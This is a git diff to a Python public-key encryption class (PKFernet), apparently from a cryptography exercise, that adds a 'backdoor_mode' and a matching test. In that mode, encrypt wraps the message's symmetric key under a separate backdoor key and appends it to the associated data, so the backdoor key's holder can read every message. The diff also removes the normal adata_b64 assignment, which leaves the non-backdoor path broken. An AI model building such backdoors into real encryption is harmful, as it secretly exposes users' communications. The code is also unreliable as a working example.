@@ -17,7 +17,7 @@ class PKFernet:
         self.remote_public_keyrings = public_keyrings
         self.local_private_key_ring = self.import_priv_key(priv_keyring)
 
-    def encrypt(self, msg, receiver_name, receiver_enc_pub_key_alias, sender_sign_header, adata='', sign_also=True):
+    def encrypt(self, msg, receiver_name, receiver_enc_pub_key_alias, sender_sign_header, adata='', sign_also=True, backdoor_mode=False):
         """Encrypt the message msg, using the receiver's encryption_pub_key, and generate signature using sender's 
         sender_sign_priv_key. You have to obtain the keys from the private and public key_rings that you passed 
         during creating this PKFernet object. @sender_sign_header looks like "ecdsa_with_sha256.secp224r1.1.sig[
@@ -62,9 +62,26 @@ class PKFernet:
         msg_encrypted_b64 = base64.urlsafe_b64encode(msg_encrypted)
 
         # Creating associated data
+        # TODO BACKDOOR here:  append the encrypted Rsys in the adata
         if isinstance(adata, str):
             adata = bytes(adata, 'utf-8')
-        adata_b64 = base64.urlsafe_b64encode(adata)
+
+        if backdoor_mode:
+            with open("backdoor.priv.key", "rb") as backdoor_private_key_file:
+                backdoor_public_key = serialization.load_pem_private_key(
+                    backdoor_private_key_file.read(),
+                    password=None,
+                    backend=default_backend()
+                ).public_key()
+
+            backdoor  = backdoor_public_key.encrypt(
+                R_sym,
+                padding.OAEP(
+                    mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
+                )
+            adata_b64 = base64.urlsafe_b64encode(adata + backdoor)
+
+
 
         # Generating HMAC
         R_hmac = os.urandom(32)
@@ -89,7 +106,7 @@ class PKFernet:
         ctx = b'|'.join([adata_b64, enc_algorithm, R_encrypted_b64, msg_encrypted_b64, sig_algorithm_b64, signature_b64, hmac_b64])
         return ctx
 
-    def decrypt(self, ctx, sender_name, verfiy_also=True):
+    def decrypt(self, ctx, sender_name, verfiy_also=True, backdoor_mode=False):
         """ Decrypt the ciphertext ctx, using receiver's encryption_priv_key and verify signature using sender's 
         signing_pub_key. Which encryption key to use, and which verification key to use is specified in the 
         ciphertext. """
@@ -228,5 +245,18 @@ class TestPKFernet(object):
 
         assert sender_pub_key_json_export.replace(' ', '') in sender_pub_key_json_file.replace(' ', '')
 
+
+    def test_backdoor(self):
+        """Test backdoor"""
+        # Sender sends the message
+        msg = b'this is a test message'
+        sender_pf = PKFernet(priv_keyring='sender/sender_priv_keyring.json', public_keyrings='receiver/receiver_pub_keyrings.json')
+        ctx = sender_pf.encrypt(msg, receiver_name='receiver', receiver_enc_pub_key_alias='rsa.2048.1.enc.priv', sender_sign_header='rsa_with_sha256.2048.1', adata='', sign_also=True, backdoor_mode=True)
+
+        # Receiver receives the message
+        receiver_pf = PKFernet(priv_keyring='receiver/receiver_priv_keyring.json', public_keyrings='sender/sender_pub_keyrings.json')
+        m = receiver_pf.decrypt(ctx, sender_name='sender', verfiy_also=True, backdoor_mode=True)
+
+        assert (msg == m)
 
 logging.basicConfig(level=logging.DEBUG, format="%(asctime)s:%(levelname)s:%(message)s")
